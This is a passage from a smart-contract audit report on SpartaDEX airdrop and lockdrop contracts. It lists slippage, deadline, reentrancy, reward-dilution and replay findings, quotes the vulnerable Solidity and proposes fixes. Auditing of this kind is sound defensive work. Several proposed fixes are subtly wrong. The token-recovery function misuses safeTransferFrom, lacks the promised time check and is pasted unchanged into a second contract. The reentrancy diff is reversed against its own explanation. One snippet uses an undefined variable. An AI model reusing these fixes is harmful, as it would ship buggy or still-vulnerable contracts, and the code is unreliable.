{\r\n```\r\n\r\n**Recommendation:** The `calculateTotalReward` function should be refactored to handle a large number of allocations without exceeding the gas limit. One approach could be to design the function so it can process allocations in ranges. This would allow it to handle a large number of allocations over multiple transactions, rather than attempting to process all allocations in a single transaction.\r\n\r\n## High Risk\r\n\r\n### [H-1] Unclaimed tokens are locked forever in the Airdrop.sol contract\r\n\r\n**Context:** [Airdrop.sol](https://github.com/SpartaDEX/sdex-smart-contracts/blob/47bf1157f87d4db12066cfb5e8f25e8571b7d2c0/contracts/airdrop/Airdrop.sol#L7)\r\n\r\nUnclaimable tokens are stuck in the Airdrop.sol contract.\r\n\r\n**Impact:** As a result of this issue, tokens that are not claimed during the designated timeframe, or "dust" tokens left over due to small discrepancies in calculations, remain stuck in the Airdrop.sol contract indefinitely. This means these tokens are effectively lost, decreasing the total available supply and potentially distorting the token\'s market dynamics.\r\n\r\n**Description:** Airdrop.sol facilitates an airdrop mechanism for distributing tokens. It includes functions for setting claimable amounts for users, allowing users to claim their tokens once the claim start timestamp has passed, and enabling users to lock tokens on the LockdropPhase2 contract\r\n\r\nThe problem is that there might be the scenario where some tokens are left unclaimed (for example, if no user claim rewards at all) OR there is some dust left. In this case, the contract owners might want to retrieve the unclaimed tokens.\r\n\r\n**Recommendation**\r\n\r\nImplement a token recovery function that can be executed only by `onlyAirdropManagerRole`, but only after the airdrop period ends.\r\n\r\nThis will allow addresses which have the onlyAirdropManagerRole to recover excess tokens from the contract.\r\n\r\n```solidity\r\n    function recoverERC20(uint256 tokenAmount) external onlyAirdropManagerRole {\r\n        IERC20(token).safeTransferFrom(address(this), msg.sender, tokenAmount);\r\n    }\r\n\r\n```\r\n\r\n### [H-2] addTargetLiquidity and removeSourceLiquidity has no slippage protection, which can result in in loss of funds\r\n\r\nContext: [LockdropPhase1.sol](https://github.com/SpartaDEX/sdex-smart-contracts/blob/27d41915ff88f798123c47a04af5f3bff3b5fe83/contracts/lockdrop/LockdropPhase1.sol#L403-L442)\r\n\r\n**Impact**\r\n\r\nThe current implementation of the `removeSourceLiquidity()` function in the smart contract lacks slippage protection. This omission might expose users to potential price manipulation, where malicious actors could intentionally cause price slippage, leading to significant losses when users remove liquidity. As a result, users could lose a significant portion of their funds when they remove liquidity from the pool, which could erode trust in the smart contract.\r\n\r\n**Description**\r\n\r\nThe `removeSourceLiquidity()` function allows users to remove liquidity that they\'ve previously added to the pool. This function iterates through each locking token and retrieves the balance of the token for the smart contract. However, when removing liquidity from the pool, there\'s no provision for slippage protection.\r\n\r\nIn the existing implementation, the function uses the `removeLiquidity()` function of the router without specifying the minimum amounts of tokens that should be received in return (`amountAMin` and `amountBMin` are set to zero):\r\n\r\n```solidity\r\n   function removeSourceLiquidity()\r\n        external\r\n        onlyOnLockdropState(LockdropState.REWARD_RATES_CALCULATED)\r\n        onlyLockdropPhase1Resolver\r\n    {\r\n        if (sourceLiquiditiesRemoved_) {\r\n            revert SourceLiquidityAlreadyRemoved();\r\n        }\r\n        uint256 lockingTokensLength = lockingTokens.length;\r\n        for (\r\n            uint32 lockingTokenId = 0;\r\n            lockingTokenId < lockingTokensLength;\r\n            ++lockingTokenId\r\n        ) {\r\n            IUniswapV2Pair token = lockingTokens[lockingTokenId].token;\r\n            uint256 balance = token.balanceOf(address(this));\r\n            IUniswapV2Router02 router = lockingTokens[lockingTokenId].router;\r\n            if (!token.approve(address(router), balance)) {\r\n                revert ApproveFailed();\r\n            }\r\n\r\n            (address token0, address token1) = _tokens();\r\n\r\n            if (balance == 0) {\r\n                continue;\r\n            }\r\n\r\n\r\n            // @audit-issue no slippage protection\r\n            router.removeLiquidity(\r\n                token0,\r\n                token1,\r\n                balance,\r\n>>                0,\r\n>>                0,\r\n                address(this),\r\n                block.timestamp\r\n            );\r\n        }\r\n\r\n        sourceLiquiditiesRemoved_ = true;\r\n    }\r\n```\r\n\r\nThis implementation essentially means that the function would still execute successfully even if the actual amounts of tokens received are far less than expected due to price slippage, which could occur due to market volatility or malicious manipulation.\r\n\r\nUnfortunately, the same issue applies to `addTargetLiquidity`.\r\n\r\n```solidity\r\n    function addTargetLiquidity(\r\n        IUniswapV2Router02 _router\r\n    )\r\n        external\r\n        onlyLockdropPhase1Resolver\r\n        onlyOnLockdropState(LockdropState.SOURCE_LIQUIDITY_EXCHANGED)\r\n    {\r\n        if (address(spartaDexRouter) != address(0)) {\r\n            revert TargetLiquidityAlreadyProvided();\r\n        }\r\n\r\n        spartaDexRouter = _router;\r\n        address spartaDexRouterAddress = address(spartaDexRouter);\r\n\r\n        // @audit-issue no slippage protection\r\n        (, , initialLpTokensBalance) = _router.addLiquidity(\r\n            tokenAAddress,\r\n            tokenBAddress,\r\n            _allowMaxErc20(IERC20(tokenAAddress), spartaDexRouterAddress),\r\n            _allowMaxErc20(IERC20(tokenBAddress), spartaDexRouterAddress),\r\n>            1,\r\n>            1,\r\n            address(this),\r\n            block.timestamp\r\n        );\r\n    }\r\n```\r\n\r\n**Recommendation:** To mitigate the risk of losing funds due to price slippage, it\'s recommended to add slippage protection to both functions. This protection can be added by specifying the minimum amounts of tokens (`amountAMin` and `amountBMin`) that should be received when removing liquidity and pass them to `router.removeLiquidity` and `router.addLiquidity` respectively.\r\n\r\n### [H-3] LockdropPhase2 lacks token recovery mechanism\r\n\r\n**Context:** [LockdropPhase2.sol](https://github.com/SpartaDEX/sdex-smart-contracts/blob/27d41915ff88f798123c47a04af5f3bff3b5fe83/contracts/lockdrop/LockdropPhase2.sol#L8)\r\n\r\n**Impact**\r\n\r\nThe lack of a proper token recovery mechanism in the `LockdropPhase2` contract for unclaimed tokens presents a significant financial risk. In the current setup, any unclaimed "sparta" and "stable" tokens become irretrievable,\r\n\r\n**Description**\r\n\r\nThe `LockdropPhase2` enables users to lock up their tokens (specifically, "sparta" and "stable" tokens) for a certain period and then later claim rewards based on the amount of tokens locked. The contract includes functions for locking tokens, unlocking tokens, and calculating rewards based on the total locked amount of each token type\r\n\r\nThe issue is that if some of these tokens are left unclaimed by users, there is no way they can be recovered from the contract owners.\r\n\r\n**Recommendation**\r\nImplement a token recovery function that can be executed only after a certain state and only by the owner of the contract.\r\n\r\nThis will allow the owners of the protocol to recover excess tokens from the contract.\r\n\r\n```solidity\r\n    function recoverERC20(uint256 tokenAmount) external onlyAirdropManagerRole {\r\n        IERC20(token).safeTransferFrom(address(this), msg.sender, tokenAmount);\r\n    }\r\n\r\n```\r\n\r\n### [H-4] ExchangeTokens lacks slippage control\r\n\r\n**Context:** [LockdropPhase2.sol](https://github.com/SpartaDEX/sdex-smart-contracts/blob/27d41915ff88f798123c47a04af5f3bff3b5fe83/contracts/lockdrop/LockdropPhase2.sol#L222-L231)\r\n\r\n**Impact**: Without slippage protection, there\'s a significant risk of unfavorable trade outcomes. The lack of guarantee that `spartaTotalLocked` will equal the stable coins required can lead to substantial financial loss. This becomes particularly concerning during periods of high market volatility.\r\n\r\n**Description**:\r\n\r\nThe `exchangeTokens` function in the LockdropPhase2 contract, is designed to add liquidity via the DEX router.\r\n\r\nHowever, currently the call lacks slippage protection, which is critical to prevent excessive losses during trade execution. The function allows for liquidity provision with minimum amounts (`1` for both `sparta` and `stable` tokens), without specifying the minimum amounts of tokens that should be received in return (`amountAMin` and `amountBMin` are set to 1):\r\n\r\n```solidity\r\n    function exchangeTokens(\r\n        IUniswapV2Router02 router_\r\n    )\r\n        external\r\n        onlyOnLockdropState(LockdropState.ALLOCATION_FINISHED)\r\n        onlyLockdropPhase2Resolver\r\n    {\r\n        (, , initialLpTokensBalance) = router_.addLiquidity(\r\n            address(sparta),\r\n            address(stable),\r\n            _allowErc20(sparta, address(router_), spartaTotalLocked),\r\n            _allowMaxErc20(stable, address(router_)),\r\n            // @audit-issue no slippage protection\r\n>            1,\r\n>            1,\r\n            address(this),\r\n            block.timestamp\r\n        );\r\n\r\n        spartaDexRouter = router_;\r\n    }\r\n```\r\n\r\n**Recommendation**\r\n\r\nTo mitigate the risk of losing funds due to price slippage, it\'s recommended to add slippage protection to both functions. This protection can be added by specifying the minimum amounts of tokens (`amountAMin` and `amountBMin`) that should be received.\r\n\r\n### [H-5] AddLiquidity and removeLiquidity is called without expiration\r\n\r\n**Context:** [LockdropPhase1](https://github.com/SpartaDEX/sdex-smart-contracts/blob/27d41915ff88f798123c47a04af5f3bff3b5fe83/contracts/lockdrop/LockdropPhase1.sol#L458-L467), [LockdropPhase2](https://github.com/SpartaDEX/sdex-smart-contracts/blob/27d41915ff88f798123c47a04af5f3bff3b5fe83/contracts/lockdrop/LockdropPhase2.sol#L222-L231)\r\n\r\n**Impact:** The current implementation can lead to significant risks including unfavorable trade outcomes and potential financial loss. Without a user-specified deadline, transactions can remain in the mempool for an extended period, resulting in execution at a potentially disadvantageous time. Moreover, by setting the deadline to `block.timestamp`, a validator can hold the transaction without any time constraints, further exposing users to the risk of price fluctuations.\r\n\r\n**Description**\r\n\r\nAdvanced protocols like Automated Market Makers (AMMs) can allow users to specify a deadline parameter that enforces a time limit by which the transaction must be executed. Without a deadline parameter, the transaction may sit in the mempool and be executed at a much later time potentially resulting in a worse price for the user.\r\n\r\nProtocols\xa0[shouldn\'t set the deadline to block.timestamp](https://code4rena.com/reports/2022-11-paraspace#m-13-interactions-with-amms-do-not-use-deadlines-for-operations)\xa0as a validator can hold the transaction and the block it is eventually put into will be block.timestamp, so this offers no protection.\r\n\r\n[No expiration deadline](https://github.com/sherlock-audit/2023-01-ajna-judging/issues/39)\xa0may create a potential critical loss of funds vulnerability for any swap, especially if there is also no slippage parameter.\r\n\r\nHowever, all the calls to addLiquidity and removeLiquidity right now are assigned `block.timestamp` as deadline\r\n\r\nhttps://github.com/SpartaDEX/sdex-smart-contracts/blob/27d41915ff88f798123c47a04af5f3bff3b5fe83/contracts/lockdrop/LockdropPhase2.sol#L230-L249\r\n\r\n```solidity\r\n    function exchangeTokens(\r\n        IUniswapV2Router02 router_\r\n    )\r\n        external\r\n        onlyOnLockdropState(LockdropState.ALLOCATION_FINISHED)\r\n        onlyLockdropPhase2Resolver\r\n    {\r\n        (, , initialLpTokensBalance) = router_.addLiquidity(\r\n            address(sparta),\r\n            address(stable),\r\n            _allowErc20(sparta, address(router_), spartaTotalLocked),\r\n            _allowMaxErc20(stable, address(router_)),\r\n            1,\r\n            1,\r\n            address(this),\r\n>            block.timestamp\r\n        );\r\n\r\n        spartaDexRouter = router_;\r\n    }\r\n```\r\n\r\nhttps://github.com/SpartaDEX/sdex-smart-contracts/blob/27d41915ff88f798123c47a04af5f3bff3b5fe83/contracts/lockdrop/LockdropPhase1.sol#L458-L467\r\n\r\n```solidity\r\n        (, , initialLpTokensBalance) = _router.addLiquidity(\r\n            tokenAAddress,\r\n            tokenBAddress,\r\n            _allowMaxErc20(IERC20(tokenAAddress), spartaDexRouterAddress),\r\n            _allowMaxErc20(IERC20(tokenBAddress), spartaDexRouterAddress),\r\n            1,\r\n            1,\r\n            address(this),\r\n>            block.timestamp\r\n        );\r\n```\r\n\r\nhttps://github.com/SpartaDEX/sdex-smart-contracts/blob/27d41915ff88f798123c47a04af5f3bff3b5fe83/contracts/lockdrop/LockdropPhase1.sol#L458-L467\r\n\r\n```solidity\r\n            router.removeLiquidity(\r\n                token0,\r\n                token1,\r\n                balance,\r\n                0,\r\n                0,\r\n                address(this),\r\n>                block.timestamp\r\n            );\r\n```\r\n\r\n**Recommendation**: To mitigate this issue, it\'s recommended to add deadline parameters to all functions interacting with AMMs and allow users to specify their preferred deadlines. These user-specified deadlines should then be passed on to the respective AMM function calls. This modification will give users more control over their transactions, reducing the associated risks. Here is a conceptual code suggestion:\r\n\r\n```solidity\r\n    function exchangeTokens(\r\n        IUniswapV2Router02 router_,\r\n        uint256 deadline  // added deadline argument\r\n    )\r\n        external\r\n        onlyOnLockdropState(LockdropState.ALLOCATION_FINISHED)\r\n        onlyLockdropPhase2Resolver\r\n    {\r\n        (, , initialLpTokensBalance) = router_.addLiquidity(\r\n            address(sparta),\r\n            address(stable),\r\n            _allowErc20(sparta, address(router_), spartaTotalLocked),\r\n            _allowMaxErc20(stable, address(router_)),\r\n            1,\r\n            1,\r\n            address(this),\r\n            deadline  // pass the deadline to the function call\r\n        );\r\n\r\n        spartaDexRouter = router_;\r\n    }\r\n\r\n```\r\n\r\n## Medium Risk\r\n\r\n### [M-1] Potential mismatch between claimable amounts and actual token balance\r\n\r\n**Context:** [Airdrop](https://github.com/SpartaDEX/sdex-smart-contracts/blob/47bf1157f87d4db12066cfb5e8f25e8571b7d2c0/contracts/airdrop/Airdrop.sol#L27-L41)\r\n\r\n**Impact:** The `setClaimableAmounts` function could potentially allow the administrators to set claimable token amounts for users that exceed the actual token balance of the contract. This could lead to a situation where users are unable to claim their tokens despite being told they have a certain amount available. This discrepancy can undermine trust in the contract, the airdrop process, and the overall project.\r\n\r\n**Description:** The `setClaimableAmounts` function sets the amount of tokens that specific users are eligible to claim from an airdrop. The function is only accessible by addresses with the `onlyAirdropManagerRole`. This function takes in two arrays, `users` and `amounts`, representing the addresses of the users and the respective amounts they can claim.\r\n\r\nHowever, this function does not validate whether the contract\'s actual token balance is sufficient to cover the total claimable amounts set for all users. This could potentially allow the contract administrators to allocate more tokens than available in the contract, leading to a shortfall when users attempt to claim their tokens.\r\n\r\n```solidity\r\n    function setClaimableAmounts(\r\n        address[] memory users,\r\n        uint256[] memory amounts\r\n    ) external override onlyAirdropManagerRole {\r\n        if (users.length != amounts.length) {\r\n            revert ArraysLengthNotSame();\r\n        }\r\n\r\n        uint256 length = users.length;\r\n        for (uint256 i = 0; i < length; ++i) {\r\n            claimableAmounts[users[i]] = amounts[i];\r\n            emit WalletAdded(users[i], amounts[i]);\r\n        }\r\n    }\r\n\r\n```\r\n\r\n**Recommendation:** It\'s recommended to add a check to ensure the total claimable amounts do not exceed the actual token balance of the contract. This can be done by calculating the sum of all claimable amounts and comparing it to the contract\'s token balance. If the total claimable amount exceeds the contract\'s balance, the function should revert the transaction.\r\n\r\n```solidity\r\n            unchecked {\r\n                sum += _claimableAmount[i];\r\n            }\r\n        }\r\n\r\n        // sanity check that the current has been sufficiently allocated\r\n        require(token.balanceOf(address(this)) >= sum, "TokenDistributor: not enough balance");\r\n        totalClaimable = sum;\r\n```\r\n\r\nAlternatively, to ensure that the claimable amounts always correspond to the actual tokens available, you could modify the `setClaimableAmounts` function so that it pulls the corresponding amount of tokens from the sender (i.e., the address with `onlyAirdropManagerRole`) when setting the claimable amounts. This way, every time claimable amounts are set, the tokens are immediately transferred to the contract, guaranteeing that the contract has enough tokens for users to claim.\r\n\r\n```solidity\r\n            unchecked {\r\n                sum += _claimableAmount[i];\r\n            }\r\n        }\r\n        // Transfer the total amount of tokens from the sender to the contract\r\n        require(IERC20(token).transferFrom(msg.sender, address(this),totalAmount), "Token transfer failed");\r\n        totalClaimable = sum;\r\n```\r\n\r\n### [M-2] Potential manipulation of airdrop claimable amounts in setClaimableAmounts function\r\n\r\n**Context:** [Airdrop](https://github.com/SpartaDEX/sdex-smart-contracts/blob/47bf1157f87d4db12066cfb5e8f25e8571b7d2c0/contracts/airdrop/Airdrop.sol#L27-L41)\r\n\r\n**Description:** The `setClaimableAmounts` function sets the amount of tokens that specific users are eligible to claim from an airdrop. The function is only accessible by addresses with the `onlyAirdropManagerRole`. This function takes in two arrays, `users` and `amounts`, representing the addresses of the users and the respective amounts they can claim.\r\n\r\n```solidity\r\n    function setClaimableAmounts(\r\n        address[] memory users,\r\n        uint256[] memory amounts\r\n    ) external override onlyAirdropManagerRole {\r\n        if (users.length != amounts.length) {\r\n            revert ArraysLengthNotSame();\r\n        }\r\n\r\n        uint256 length = users.length;\r\n        for (uint256 i = 0; i < length; ++i) {\r\n            claimableAmounts[users[i]] = amounts[i];\r\n            emit WalletAdded(users[i], amounts[i]);\r\n        }\r\n    }\r\n\r\n```\r\n\r\nHowever, the function as currently written can potentially be exploited. Specifically, the `onlyAirdropManagerRole` user has the ability to manipulate the claimable amounts even after they are first set. This could be used to arbitrarily change the amount of tokens a user can claim, which could lead to unfair token distribution or even potential loss of tokens for the user.\r\n\r\nAnother potential issue is that if the `users` array contains duplicate addresses, the claimable amounts for these addresses will be overwritten by the last corresponding amount in the `amounts` array. This means that a user might not receive the amount they were originally intended to, or they could potentially receive more than they should. This could lead to errors in token distribution and potential loss or over-distribution of tokens.\r\n\r\n**Recommendation:** Use `+=` instead of `=`\r\n\r\n```diff\r\nfor (uint256 i = 0; i < length; ++i) {\r\n+     claimableAmounts[users[i]] += amounts[i];\r\n     emit WalletAdded(users[i], amounts[i]);\r\n}\r\n```\r\n\r\n### [M-3] Duplicate locking expiration timestamps can dillute the rewards\r\n\r\n**Context:** [LockdropPhase1.sol](https://github.com/SpartaDEX/sdex-smart-contracts/blob/27d41915ff88f798123c47a04af5f3bff3b5fe83/contracts/lockdrop/LockdropPhase1.sol#L194-L228)\r\n\r\n#### Impact\r\n\r\nThe current implementation of the `calculateRewardRates()` function in the LockdropPhase1.sol smart contract has a potential vulnerability where rewards might get diluted. This dilution could occur if there are any duplicate locking expiration timestamps, which could lead to a duration of zero during reward calculation. As a result, users may receive less reward than they are supposed to, impacting the fairness and trustworthiness of the reward distribution mechanism.\r\n\r\n#### Description\r\n\r\nThe `calculateRewardRates()` function calculates reward rates for different time ranges based on locking expiration timestamps and total points in each round. The function is designed to prevent multiple calls once the reward rates have been calculated. However, it doesn\'t account for a situation where there could be duplicate timestamps.\r\n\r\n```solidity\r\n    function calculateRewardRates()\r\n        external\r\n        override\r\n        onlyOnLockdropState(LockdropState.TOKENS_ALLOCATION_FINISHED)\r\n    {\r\n        if (rewardRateCalculated_) {\r\n            revert RewardRatesAlreadyCalculated();\r\n        }\r\n\r\n        uint256 timeRangesLength = lockingExpirationTimestamps.length;\r\n        // @audit-issue timeRangesLength could DoS, as it has no limit\r\n        uint256 lastTimestamp = lockingEnd;\r\n\r\n        for (\r\n            uint32 timeRangeIndex = 0;\r\n            timeRangeIndex < timeRangesLength;\r\n            ++timeRangeIndex\r\n        ) {\r\n            if (totalPointsInRound[timeRangeIndex] != 0) {\r\n\r\n                // @audit-issue if last lockingEnd == lockingExpirationTimestamps[timeRangeIndex]\r\n                // duration will be 0, if its the first locking expiration timestamp\r\n                // that will dillute the rewards\r\n                uint256 duration = lockingExpirationTimestamps[timeRangeIndex] -\r\n                    lastTimestamp;\r\n                rewardPerPointInTimeRange[timeRangeIndex] =\r\n                    (rewardRate * duration) /\r\n                    totalPointsInRound[timeRangeIndex];\r\n            }\r\n\r\n            lastTimestamp = lockingExpirationTimestamps[timeRangeIndex];\r\n        }\r\n\r\n        rewardRateCalculated_ = true;\r\n    }\r\n```\r\n\r\nHere, `lastTimestamp` is set to the current locking expiration timestamp for each iteration:\r\n\r\n```solidity\r\nlastTimestamp = lockingExpirationTimestamps[timeRangeIndex];\r\n```\r\n\r\nIf there happen to be duplicate timestamps, `duration` will equate to zero. Consequently, the calculated reward per point for that time range will also be zero.\r\n\r\nRunning the following test\r\n\r\nhttps://github.com/SpartaDEX/sdex-smart-contracts/blob/27d41915ff88f798123c47a04af5f3bff3b5fe83/test/lockdrop/lockdrop.test.ts#L755-L768\r\n\r\n```typescript\r\nconst allocation2 = await lockdropPhase1.userAllocations(\r\n    lpProvider1.address,\r\n    2\r\n);\r\n\r\nconst expectedReward = await calculateExpectedRewardFromAllocations([\r\n    allocation1,\r\n    allocation2,\r\n]);\r\n\r\nconsole.log(expectedReward);\r\n```\r\n\r\nWith these [rewards](https://github.com/SpartaDEX/sdex-smart-contracts/blob/27d41915ff88f798123c47a04af5f3bff3b5fe83/test/lockdrop/lockdrop.test.ts#L246-L253)\r\n\r\n```typescript\r\nexpirationTimestamps = [\r\n    lockdropPhase2LockingEnd,\r\n    lockdropPhase2LockingEnd + 100,\r\n    lockdropPhase2LockingEnd + 200,\r\n    lockdropPhase2LockingEnd + 350,\r\n    lockdropPhase2LockingEnd + 1000,\r\n];\r\n```\r\n\r\nYields the following result\r\n\r\n![](https://i.imgur.com/xp3xAA8.png)\r\n\r\nHowever, if the tests are executed with the rewards below\r\n\r\n```typescript\r\nexpirationTimestamps = [\r\n    lockdropPhase2LockingEnd,\r\n    lockdropPhase2LockingEnd,\r\n    lockdropPhase2LockingEnd + 100,\r\n    lockdropPhase2LockingEnd + 200,\r\n    lockdropPhase2LockingEnd + 350,\r\n    lockdropPhase2LockingEnd + 1000,\r\n];\r\n```\r\n\r\nIt shows that the rewards are dilluted, even if they should not be.\r\n\r\n![](https://i.imgur.com/iTSvAEA.png)\r\n\r\n**Recommendation:** It is recommended to add a check during the constructor time to ensure that the `lockingExpirationTimestamps` array doesn\'t contain any duplicate values.\r\n\r\n## Low Risk\r\n\r\n### [L-1] Missing sanity checks for claimStartTimestamp in Airdrop contract\r\n\r\n**Context**: [Airdrop.sol](https://github.com/SpartaDEX/sdex-smart-contracts/blob/47bf1157f87d4db12066cfb5e8f25e8571b7d2c0/contracts/airdrop/Airdrop.sol#L18-L23)\r\n\r\n**Impact**\r\n\r\nThe absence of sanity checks for the `_claimStartTimestamp` parameter in the Airdrop contract can lead to potential vulnerabilities and unexpected behavior. It may allow the contract to be initialized with a `claim` start timestamp that is not in the future, which **could** undermine the intended functionality and fairness of the airdrop.\r\n\r\n**Description**\r\n\r\nIn the `Airdrop` contract, the constructor accepts a `_claimStartTimestamp` parameter to set the start timestamp for claiming airdrop tokens. However, there are no explicit sanity checks to ensure that the provided `_claimStartTimestamp` value is in the future.\r\n\r\n```solidity\r\n\r\nuint256 _claimStartTimestamp,\r\n        ILockdropPhase2 _lockdrop,\r\n        IAccessControl _acl\r\n    ) {\r\n        token = _token;\r\n        claimStartTimestamp = _claimStartTimestamp;\r\n\r\n```\r\n\r\n**Recommendation**\r\n\r\nTo mitigate this vulnerability, it is crucial to implement sanity checks and ensure that the `_claimStartTimestamp` value provided in the constructor is in the future. For example, you can add a validation check within the constructor to ensure that `_claimStartTimestamp` is greater than the current `block timestamp`.\r\n\r\nThis can be done using a condition such as `require(_claimStartTimestamp > block.timestamp, "Claim start time must be in the future");`.\r\n\r\n### [L-2] Possibility for division by zero in LockdropPhase1\r\n\r\n**Context**: [LockdropPhase1.sol](https://github.com/SpartaDEX/sdex-smart-contracts/blob/27d41915ff88f798123c47a04af5f3bff3b5fe83/contracts/lockdrop/LockdropPhase1.sol#L61-L65)\r\n\r\n**Impact**\r\n\r\nThe vulnerability in the `LockdropPhase1.sol` contract can potentially lead to a division by zero error. This error can cause the function execution to revert, resulting in unexpected behavior or denial of service for users interacting with the contract.\r\n\r\n**Description**\r\n\r\nThe issue lies in the calculation of the rewardRate variable in the `LockdropPhase1` contract. The rewardRate is calculated by dividing the `_rewardParams.rewardAmount` by the time difference between the last element in the `lockingExpirationTimestamps` array and the `lockingEnd` value.\r\n\r\n```solidity\r\n\r\nrewardRate =\r\n            _rewardParams.rewardAmount /\r\n            (lockingExpirationTimestamps[\r\n                lockingExpirationTimestamps.length - 1\r\n            ] - lockingEnd);\r\n\r\n```\r\n\r\nHowever, if the value of `lockingExpirationTimestamps[lockingExpirationTimestamps.length - 1]` is equal to `lockingEnd`, the division operation would result in a division by zero error. This occurs because the denominator in the division operation becomes zero, which is an invalid mathematical operation.\r\n\r\nAs a result, when this condition is met, the contract will throw an exception and revert the transaction, preventing it from proceeding further.\r\n\r\n**Recommendation**\r\n\r\nTo address this, make sure to sanitize the `lockingExpirationTimestamps` for erronous values before calculating the reward rate.\r\n\r\n### [L-3] LockdropPhase2 is prone to reentrancy\r\n\r\n**Context:** [LockdropPhase2](https://github.com/SpartaDEX/sdex-smart-contracts/blob/27d41915ff88f798123c47a04af5f3bff3b5fe83/contracts/lockdrop/LockdropPhase2.sol#L92-L97)\r\n\r\n**Impact:** The code block performs a token transfer before updating the internal state (`stableTotalLocked`, `walletStableLocked[msg.sender]`). This violates the check-effects-interaction pattern, which is a best practice in smart contract development. If the token used is an ERC20 compatible ERC777 or has similar re-entrancy capabilities, the receiver of the `transfer` call could re-enter the contract and interact with it while its internal state is not yet updated, leading to to unlimited withdrawals.\r\n\r\n```solidity\r\n        if (!stable.transfer(msg.sender, _amount)) {\r\n            revert TransferFailed();\r\n        }\r\n\r\n        stableTotalLocked -= _amount;\r\n        walletStableLocked[msg.sender] -= _amount;\r\n```\r\n\r\n**Recommendation:** To respect the check-effects-interaction pattern, the internal state should be updated before interacting with external contracts (i.e., before calling the `transfer` function). The following code changes are recommended:\r\n\r\n```diff\r\n+        stableTotalLocked -= _amount;\r\n+        walletStableLocked[msg.sender] -= _amount;\r\n        if (!stable.transfer(msg.sender, _amount)) {\r\n            revert TransferFailed();\r\n        }\r\n\r\n-        stableTotalLocked -= _amount;\r\n-        walletStableLocked[msg.sender] -= _amount;\r\n```\r\n\r\nBy making these changes, the contract first updates the internal state and then interacts with the external token contract, which will mitigate the potential vulnerability.\r\n\r\n### [L-4] Violation of the Check-Effects-Interaction pattern in getRewardAndSendOnVesting\r\n\r\n**Context:** [LockdropPhase1.sol](https://github.com/SpartaDEX/sdex-smart-contracts/blob/27d41915ff88f798123c47a04af5f3bff3b5fe83/contracts/lockdrop/LockdropPhase1.sol#L364-L374)\r\n\r\n**Impact**\r\n\r\nThis vulnerability can lead to potential unlimited claims of the reward if the reward token adheres to the ERC777 standard, which is backward compatible with ERC20. Although it\'s currently minor as the reward token is supposedly the `sparta` token, it can be a major issue if any other tokens are used in the future.\r\n\r\nThe `getRewardAndSendOnVesting` function is designed to distribute rewards to a user in a two-fold manner: immediate transfer and vesting. The function first validates if the second phase of locking has ended, then calculates the total reward for the user, divides it in half, and sends one half immediately while the other half is designated for vesting.\r\n\r\nThe issue is that it does not follow the Check-Effects-Interaction (CEI) pattern. Specifically, it attempts to transfer tokens before updating the critical `userRewardWithdrawn` state variable. This sequence can potentially allow a reentrancy attack, exploiting the token\'s hooks to call `getRewardAndSendOnVesting` again before the state variable is updated.\r\n\r\n```solidity\r\n        uint256 reward = calculateTotalReward(msg.sender);\r\n        uint256 alreadyWithdrawn = userRewardWithdrawn[msg.sender];\r\n        if (_rewardClaimed(alreadyWithdrawn, reward)) {\r\n            revert MaxRewardExceeded();\r\n        }\r\n        uint256 toSendOnVesting = reward / 2;\r\n        uint256 remainingReward = toSendOnVesting - alreadyWithdrawn;\r\n        if (!rewardToken.transfer(msg.sender, remainingReward)) {\r\n            revert TransferFailed();\r\n        }\r\n        userRewardWithdrawn[msg.sender] = reward;\r\n\r\n\r\n        vesting.addVesting(\r\n            msg.sender,\r\n            lockingEnd,\r\n            VESTING_DURATION,\r\n            _allowErc20(rewardToken, address(vesting), toSendOnVesting)\r\n        );\r\n```\r\n\r\n**Recommendation**:\r\n\r\nThe solution to this vulnerability is to follow the Check-Effects-Interaction pattern by updating the state (`userRewardWithdrawn[msg.sender] = reward`) before attempting to transfer the tokens.\r\n\r\n```solidity\r\n        uint256 reward = calculateTotalReward(msg.sender);\r\n        uint256 alreadyWithdrawn = userRewardWithdrawn[msg.sender];\r\n        if (_rewardClaimed(alreadyWithdrawn, reward)) {\r\n            revert MaxRewardExceeded();\r\n        }\r\n        uint256 toSendOnVesting = reward / 2;\r\n        uint256 remainingReward = toSendOnVesting - alreadyWithdrawn;\r\n-       userRewardWithdrawn[msg.sender] = reward;\r\n        if (!rewardToken.transfer(msg.sender, remainingReward)) {\r\n            revert TransferFailed();\r\n        }\r\n+       userRewardWithdrawn[msg.sender] = reward;\r\n\r\n        vesting.addVesting(\r\n            msg.sender,\r\n            lockingEnd,\r\n            VESTING_DURATION,\r\n            _allowErc20(rewardToken, address(vesting), toSendOnVesting)\r\n        );\r\n```\r\n\r\n### [L-5] Potential for Cross-Chain Replay attacks due to hard-coded Domain Separator\r\n\r\n**Context:** [SpartaDexERC20.sol](https://github.com/SpartaDEX/sdex-smart-contracts/blob/27d41915ff88f798123c47a04af5f3bff3b5fe83/contracts/dex/core/SpartaDexERC20.sol#L21-L33)\r\n\r\n**Impact**\r\n\r\nThis vulnerability could lead to unauthorized transactions on a new chain after a split, posing significant security risks to users. In the worst case, assets could be unintentionally transferred or manipulated on the unintended chain.\r\n\r\n**Description**\r\n\r\nThe smart contract in question computes the `DOMAIN_SEPARATOR` during initialization, which is then stored and subsequently used for signature verification. Notably, this `DOMAIN_SEPARATOR` contains the chain ID, which remains constant post-initialization.\r\n\r\nThe vulnerability arises in the event of a chain split. In such a case, only one chain will retain the original chain ID, with the other adopting a new one. Due to the static nature of the `DOMAIN_SEPARATOR`, a signature will be erroneously considered valid on both chains post-split. This opens up the potential for cross-chain replay attacks, as transactions on one chain could be replayed on the other.\r\n\r\n```solidity\r\n    constructor() {\r\n        DOMAIN_SEPARATOR = keccak256(\r\n            abi.encode(\r\n                keccak256(\r\n                    "EIP712Domain(string name,string version,uint256 chainId,address verifyingContract)"\r\n                ),\r\n                keccak256(bytes(name)),\r\n                keccak256(bytes("1")),\r\n                1729,\r\n                address(this)\r\n            )\r\n        );\r\n    }\r\n```\r\n\r\nTo mitigate this vulnerability, it is recommended that the chain ID be computed dynamically rather than being hard-coded into the `DOMAIN_SEPARATOR` during initialization. This can be done using the `chainid()` function within the EVM, as illustrated below:\r\n\r\n**Recommendation**\r\n\r\n```solidity\r\n    function _chainId() internal view returns (uint256 chainId_) {\r\n        assembly {\r\n            chainId_ := chainid()\r\n        }\r\n    }\r\n```\r\n\r\nFurthermore, you should check whether the current chain ID matches the original one before computing the domain separator:\r\n\r\n```solidity\r\nif (block.chainid != ORIGINAL_CHAIN_ID) {\r\n\r\n            bytes32 domain_separator = keccak256(abi.encode(DOMAIN_TYPEHASH, keccak256(bytes("...")), block.chainid, address(this)));\r\n        } else {\r\n            digestHash = 